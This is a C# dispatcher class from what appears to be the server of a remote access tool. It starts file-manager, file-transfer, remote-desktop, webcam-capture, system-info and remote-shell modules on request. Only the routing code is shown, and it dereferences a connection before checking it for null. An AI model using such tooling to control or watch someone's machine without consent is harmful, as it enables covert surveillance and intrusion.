using bc.srv.Modules.Desktop;
using bc.srv.Modules.File_Manager;
using bc.srv.Modules.Remote_Shell;
using bc.srv.Modules.System_Info;
using bc.srv.Modules.WebCam;

namespace bc.srv.Classes
{
    internal class ModuleStarter
    {
        /// <summary>
        ///     Salvo il nuovo stream tra la lista stream in ST e avvio il thread FM
        /// </summary>
        /// <param name="servizio"></param>
        /// <param name="reqId"></param>
        public void StartSlotService(string servizio, string reqId)
        {
            var con = new Connection();

            var ns = con.NewSlotRequest(servizio, reqId);

            SrvData.Instance.nsListaCanali.Add(ns.GetStream());

            if (ns != null)
                switch (servizio)
                {
                    case "FILEMANAGER":
                        var fm = new FileManager(ns);
                        fm.StartFmThread();
                        break;

                    case "IMAGESLOT":
                        var fmIm = new FileManager(ns);
                        fmIm.StartImThread();
                        break;

                    case "GALLERYSLOT":
                        var fmGl = new FileManager(ns);
                        fmGl.StartGalleryThread();
                        break;

                    case "SEARCHSLOT":
                        var lf = new ListFiles(ns.GetStream());
                        lf.StrtListSearch();
                        break;

                    case "FILE_TRANSFER":
                        var fmFt = new FileManager(ns);
                        fmFt.StartTransfThread();
                        break;

                    case "REMOTE_DESKTOP":
                        var da = new DesktopAgent(ns.GetStream());
                        da.StartDesktopListener();
                        break;

                    case "WEBCAM_CAPTURE":
                        var wa = new WebCamAgent(ns.GetStream());
                        wa.StartWebCamListener();
                        break;

                    case "SYSTEM_INFO":
                        var sa = new SystemAgent(ns.GetStream());
                        sa.StartSystemListener();
                        break;

                    case "REMOTE_SHELL":
                        var rsa = new RemoteShellAgent(ns.GetStream());
                        rsa.StartShellListener();
                        break;
                }
        }
        //----------------------------------------------------------------------
    }
}